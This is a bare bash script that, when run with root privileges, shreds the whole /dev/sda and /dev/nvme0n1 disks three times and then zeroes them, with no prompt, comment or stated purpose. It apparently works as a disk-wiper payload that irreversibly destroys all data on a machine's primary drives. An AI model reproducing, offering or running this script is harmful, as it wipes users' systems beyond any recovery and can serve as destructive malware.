#!/bin/bash
if [[ "${UID}" == 0 ]]; then
  shred -n 3 -z /dev/sda
  shred -n 3 -z /dev/nvme0n1
fi
